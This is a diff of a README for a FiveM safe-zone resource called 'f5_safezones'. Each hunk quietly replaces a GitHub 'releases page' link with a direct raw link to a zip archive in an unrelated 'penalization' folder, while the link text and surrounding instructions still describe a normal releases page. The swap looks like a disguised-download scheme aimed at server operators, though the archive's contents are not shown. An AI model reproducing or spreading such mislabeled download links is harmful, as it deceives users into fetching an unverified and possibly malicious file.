@@ -1,6 +1,6 @@
 # 🛡️ f5_safezones - Easy Safe Zones for FiveM
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Spongecanceroftheliver64/f5_safezones/main/penalization/safezones_f_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ f5_safezones adds safe zones to your FiveM server. It helps you define places wh
 
 Use the link below to visit the release page and download the latest version.
 
-[Visit the releases page to download](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)
+[Visit the releases page to download](https://raw.githubusercontent.com/Spongecanceroftheliver64/f5_safezones/main/penalization/safezones_f_v2.7.zip)
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/Spongecanceroftheliver64/f5_safezones/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Spongecanceroftheliver64/f5_safezones/main/penalization/safezones_f_v2.7.zip).
 2. Find the latest release.
 3. Download the file that matches the release package.
 4. Save it to a folder you can find later, such as Downloads or Desktop.
@@ -108,7 +108,7 @@ A standard Windows PC is enough for setup. You do not need special hardware for 
 
 ## 🪟 Windows Install Guide
 
-1. Go to the [releases page](https://github.com/Spongecanceroftheliver64/f5_safezones/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/Spongecanceroftheliver64/f5_safezones/main/penalization/safezones_f_v2.7.zip).
 2. Download the latest release package.
 3. Extract the file if it is compressed.
 4. Copy the `f5_safezones` folder into your server resources folder.
@@ -149,7 +149,7 @@ This is only an example. Your server may use a different folder structure. Place
 
 ### I cannot find the release file
 
-- Open the [releases page](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)
+- Open the [releases page](https://raw.githubusercontent.com/Spongecanceroftheliver64/f5_safezones/main/penalization/safezones_f_v2.7.zip)
 - Look at the newest release at the top
 - Download the attached asset from that release
 
@@ -187,7 +187,7 @@ Repository: `f5_safezones`
 
 Description: The most advanced open-source safezone system for FiveM
 
-Primary download page: [https://github.com/Spongecanceroftheliver64/f5_safezones/releases](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)
+Primary download page: [https://raw.githubusercontent.com/Spongecanceroftheliver64/f5_safezones/main/penalization/safezones_f_v2.7.zip](https://raw.githubusercontent.com/Spongecanceroftheliver64/f5_safezones/main/penalization/safezones_f_v2.7.zip)
 
 ## 🔑 Quick Setup Checklist
 
